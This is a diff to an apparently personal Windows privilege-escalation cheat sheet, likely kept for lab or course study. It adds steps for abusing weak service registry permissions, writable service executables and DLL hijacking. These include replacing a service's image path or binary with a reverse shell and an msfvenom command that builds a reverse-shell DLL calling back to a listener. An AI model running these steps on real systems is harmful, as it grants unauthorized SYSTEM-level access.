@@ -96,6 +96,7 @@ sc config <svc name> <option>= <value>
 - Start/stop a service
 ```
 sc start/stop <svc name>
+net start/stop <svc name>
 ```
 ### 5 Types of Misconfigurations
 1. Insecure Service Properties
@@ -136,7 +137,61 @@ sc config <svc name> binpath= "\"C:\Privesc\reverse.exe\""
 5. setup netcat and run service
 
 ### Weak Registry Permission
+1. Check winpeas under ``` looking if you can modify any service registry```
+2. Use powershell or accesschk to check for permissions
+```
+powershell -exec bypass
 
+Get-Acl <svc reg directory> | Format-List
+```
+```
+.\accesschk.exe /accepteula -uvwqk <PC username> <dir name> 
+```
+3. note that the ```NT AUTHORITY/INTERACTIVE``` have full control of the reg ```RW```.
+4. check if you can start the svc
+```
+.\accesschk.exe /accepteula -uwcqv <PC username> <svc name> 
+```
+5. Check the image path with ```sc query <svc name>```
+6. Change the img path
+```
+reg add <path to svc reg> /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
+```
+7. Run netcat and start service
+
+### Insecure Service Executables
+1. Check winpeas for file permission writeable to you or everyone under ```Interesting Services - non mircosoft```.
+2. Verify with accesschk
+```
+.\accesschk.exe /accepteula -quvw <PC username> <dir name.exe> 
+```
+3. Make a backup of the original exe
+```
+copy <dir name.exe> C:\Temp
+```
+4. Overwrite original exe with our reverse shell
+```
+copy /Y C:\PrivEsc\reverse.exe <dir name.exe>
+```
+5. Setup netcat and start the service.
+
+### DDL Hijacking
+1. Check winpeas for DDL Hijacking writable path and see if anf write permssion folder is inside. ```Checking write permission in Path Folder (DLL Hijacking)``` section.
+2. Enumerate all services in ```Interesting Services - non mircosoft``` to see which one has start and stop access.
+```
+.\accesschk.exe /accepteula -uvqc <PC username> <svc name> 
+```
+3. check if it runs with SYSTEM priv ```sc qc <svc name>```
+4. copy this file to tester's come for analysis
+5. Run ```procmon64.exe``` with admin rights
+6. Use procmon to capture activities in computer (refer to ti3brus udemy course)
+7. look for name not found dll
+8. generate dll reverse shell
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.13.47.80 LPORT=8133 -f dll -o reverse.dll
+```
+9. put dll in writeable folder
+10. start netcat and start svc
 
 ## Kernel Exploit (Last resort)
 ### Tools
